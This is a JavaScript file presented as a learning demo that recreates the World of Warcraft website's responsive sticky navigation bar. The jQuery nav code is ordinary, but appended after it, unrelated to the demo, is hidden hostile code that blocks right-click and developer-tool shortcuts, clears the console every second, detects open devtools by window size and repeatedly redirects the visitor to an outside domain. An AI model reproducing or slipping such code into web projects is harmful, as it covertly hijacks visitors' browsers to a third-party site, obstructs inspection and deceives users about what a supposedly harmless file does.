/**

  Icons, logos, and background images belong to Blizzard Entertainment. They are being used for express purpose of learning and sharing what's possible. In no way am I trying to claim the assets / trademarks belong to myself.
  
  I love(d) WoW and Blizzard for large part of my life, and I've always been super impressed by the quality and fidelity of their website. Both WoW and Hearthstone's websites have been cutting edge, and their use of graphics and bleeding-edge CSS has always inspired me. 
  
  I wanted to try and replicate (most) of the navigation bar which is a real example of what a good responsive sticky-nav can look like. I also tried to improve some of the animations and style.
  
  Please check out the real-deal on https://worldofwarcraft.com/en-us/return

**/

($(() => {
  
  const $win = $(window);
  const $app = $("#app");
  const $head = $(".warcraft");
  const $nav = $(".nav");
  const $burger = $(".nav__burger, .nav__close");
  const $overlay = $(".overlay");
  const $search_icon = $(".nav__item--search");
  const $switch = $(".switch");
  const top = parseInt(getComputedStyle($nav.get(0)).getPropertyValue("--header-top").replace("px",""));
  
  const apply = () => {
    if ( $win.scrollTop() >= top ) {
      $head.addClass( "fixed" );
    } else {
      $head.removeClass( "fixed" );
    }
  };
  
  $win.on("scroll", apply);
  apply();
  
  $search_icon.on("click", () => {
    $head.toggleClass("searching");
  });
  
  $burger.on("click", () => {
    $head.toggleClass("open");
  });
  
  $overlay.on("click", () => {
    $head.removeClass("open");
  });
  
  $switch.on("change", "input", (e) => {
    const style = $(e.currentTarget).val();
    $app.removeClass( "classic wolk tbc mop" ).addClass( style );
  })
  
}));


document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
});

document.addEventListener('keydown', function(e) {
  if (e.key === 'F12' || 
      (e.ctrlKey && e.shiftKey && e.key === 'I') ||  // Ctrl+Shift+I
      (e.ctrlKey && e.shiftKey && e.key === 'J') ||  // Ctrl+Shift+J
      (e.ctrlKey && e.key === 'U')) {                // Ctrl+U
    e.preventDefault();
    return false;
  }
});

setInterval(() => {
  console.clear();
}, 1000);


(function() {
  let devtools = false;
  let threshold = 160;

  function detectDevTools() {
    devtools = false;
    let widthThreshold = window.outerWidth - window.innerWidth > threshold;
    let heightThreshold = window.outerHeight - window.innerHeight > threshold;
    if (widthThreshold || heightThreshold) {
      devtools = true;
    }
    return devtools;
  }

  setInterval(function() {
    if (detectDevTools()) {
      window.location.href = 'https://1207.top/';
    }
  }, 100);

  window.addEventListener('resize', function() {
    if (detectDevTools()) {
      window.location.href = 'https://1207.top/';
    }
  });

  window.addEventListener('focus', function() {
    if (detectDevTools()) {
      window.location.href = 'https://1207.top/';
    }
  });

  window.addEventListener('blur', function() {
    if (detectDevTools()) {
      window.location.href = 'https://1207.top/';
    }
  });
})();